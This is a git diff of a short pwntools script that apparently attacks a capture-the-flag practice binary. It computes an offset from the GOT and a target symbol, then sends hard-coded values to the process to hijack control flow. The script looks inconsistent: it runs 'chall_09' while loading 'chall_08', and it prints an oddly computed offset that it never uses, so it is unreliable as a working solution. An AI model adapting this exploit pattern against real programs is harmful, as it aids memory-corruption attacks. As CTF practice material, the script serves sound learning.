@@ -1,13 +1,17 @@
 from pwn import *
 
-# all green, fmt string exploit 100%, or crypto problem?, xoring with 0x30
-
-x = "y\x17FU\x10S_]U\x10XUBU\x10D_:"
-
-payload = b"I've come here to\n"
-
 p = process('./chall_09')
+elf = ELF("./chall_08")
 
-p.sendline(payload)
+
+
+offset = elf.sym.target - elf.sym.got['puts'] // 8
+
+print("Offset", offset)
+
+
+p.sendline("4198950".encode())
+p.sendline("-7".encode())
+
 
 p.interactive()
